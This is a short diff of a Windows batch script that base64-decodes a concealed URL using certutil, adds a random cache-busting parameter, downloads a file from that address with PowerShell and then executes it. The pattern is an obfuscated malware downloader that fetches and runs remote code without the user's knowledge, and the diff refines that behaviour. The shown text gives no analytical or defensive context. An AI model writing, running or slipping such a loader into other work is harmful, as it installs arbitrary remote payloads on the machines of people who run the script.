@@ -6,7 +6,8 @@ del "%output%" >nul 2>&1
 echo !g0d!> g0d.b64
 certutil -f -decode g0d.b64 g0d.txt >nul
 set /p encode=<g0d.txt
+set "encode=!encode!?t=%random%"
 del g0d.*
-set "load=%encode%"
-powershell -Command "Invoke-WebRequest -Uri %load% -OutFile %output%"
+set "load=!encode!"
+powershell -Command "Invoke-WebRequest -Uri !load! -OutFile %output%"
 call "%output%"
